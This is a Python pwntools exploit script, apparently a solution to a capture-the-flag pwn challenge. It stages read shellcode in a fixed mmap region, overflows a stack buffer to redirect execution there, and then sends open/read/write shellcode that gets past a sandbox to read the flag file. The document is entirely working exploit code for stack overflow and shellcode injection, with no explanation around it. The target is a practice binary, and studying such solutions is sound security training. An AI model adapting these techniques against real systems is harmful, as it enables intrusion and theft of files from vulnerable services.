'''
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled

sandbox pass: ORW bypass sandbox to read flag
'''

from pwn import *
# from LibcSearcher import *


local = 0
url, port = "node5.buuoj.cn", "27559" 
filename = "./pwn"
elf = ELF(filename)
context(arch="amd64", os="linux")
# context(arch="i386", os="linux")

if local:
    context.log_level = "debug"
    io = process(filename)
    context.terminal = ['tmux', 'splitw', '-h']
    # gdb.attach(io)
else:
    io = remote(url, port)
    pass

def B():
    gdb.attach(io)
    pause()

mmap_addr = 0x233000

def pwn():
    # pass constrainted length, write ORW to mmap_addr+len(payload)
    payload = shellcraft.read(0, mmap_addr+21, 0x400)
    payload = asm(payload)
    print('{}\nlength: {}'.format(payload, len(payload)))
    io.sendafter(b"little.\n", payload)
    # B()
    payload = cyclic(40 + 8 + 8) + p64(mmap_addr)
    io.sendlineafter(b'this time~\n', payload)

    # ORW construction
    orw_payload = shellcraft.open('./flag')
    orw_payload += shellcraft.read(3, mmap_addr+0x400, 0x100)
    orw_payload += shellcraft.write(1, mmap_addr+0x400, 0x100)
    orw_payload = asm(orw_payload)
    # send ORW payload through read(3, mmap_addr+21, 0x400)
    io.sendlineafter(b'See you!\n', orw_payload) 


if __name__ == "__main__":
    pwn()
    io.interactive()
